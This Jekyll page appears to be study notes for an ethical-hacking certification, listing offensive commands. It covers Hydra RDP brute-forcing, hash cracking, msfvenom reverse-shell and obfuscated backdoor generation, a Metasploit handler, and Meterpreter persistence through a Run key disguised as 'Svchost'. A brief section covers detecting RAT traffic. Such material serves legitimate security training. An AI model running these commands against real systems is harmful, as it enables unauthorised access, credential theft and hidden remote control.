---
layout: default
title: Commands
parent: Domain 2 - System Hacking & Exploitation
grand_parent: Domains
nav_order: 1
---

# Domain 2: Commands Reference

## RDP Cracking

```bash
hydra -l Administrator -P rockyou.txt rdp://192.168.1.50
hydra -l admin -P password_list.txt rdp://192.168.1.50:3389
hydra -L usernames.txt -P passwords.txt rdp://192.168.1.5
hydra -l admin -P passwords.txt rdp://192.168.1.5 -v
hydra -l admin -P passwords.txt rdp://192.168.1.5 -f
```

## Hash Cracking

```bash
hashid hash_value
hashcat -m 0 -a 0 hashfile rockyou.txt           # MD5
hashcat -m 100 -a 0 hashfile rockyou.txt         # SHA1
hashcat -m 1400 -a 0 hashfile rockyou.txt        # SHA256
hashcat -m 1000 -a 0 hashfile rockyou.txt        # NTLM
john hashes.txt --wordlist=rockyou.txt
john --show hashes.txt
```

## SMB Exploitation

```bash
smbclient //192.168.1.5/Documents -U admin%password123
smbclient -L 192.168.1.5 -U admin%password123
```

## Msfvenom - Payload Generation

```bash
# Windows reverse shell (EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe

# Linux reverse shell (ELF)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > linux_shell

# Windows batch file
msfvenom -p windows/cmd/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f bat > shell.bat

# With encoder (obfuscation)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > obfuscated.exe
```

## Msfconsole - Metasploit Framework

```bash
msfconsole
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 192.168.1.100
msf> set LPORT 4444
msf> run
```

## Meterpreter Session Commands

```bash
sessions -l                             # List active sessions
sessions -i 1                           # Interact with session 1
background                             # Background current session
jobs -l                                 # List running jobs
jobs -i 1                              # Interact with background job

getuid                                 # Current user
sysinfo                                # System info
ipconfig                               # Network config
ps                                     # List processes
kill PID                               # Kill process

pwd                                    # Current directory
ls                                     # List files
download file.txt /tmp/                # Download file
upload /tmp/evil.exe c:\windows\temp\  # Upload file

execute -f cmd.exe -i                  # Interactive command shell
reg query HKLM\\Software\\Microsoft\\Windows\\Run
reg set HKLM\\Software\\Microsoft\\Windows\\Run "Svchost" "c:\windows\temp\evil.exe"
```

## Detecting RAT Connections

In Wireshark:
```
Filter: ip.src == 192.168.1.50 && tcp.dstport != 80,443,53
Look for: Persistent connections to external IPs on unusual ports
```

In tcpdump:
```bash
tcpdump -i eth0 "src 192.168.1.50 and dst not 192.168.0.0/16" -vv
```
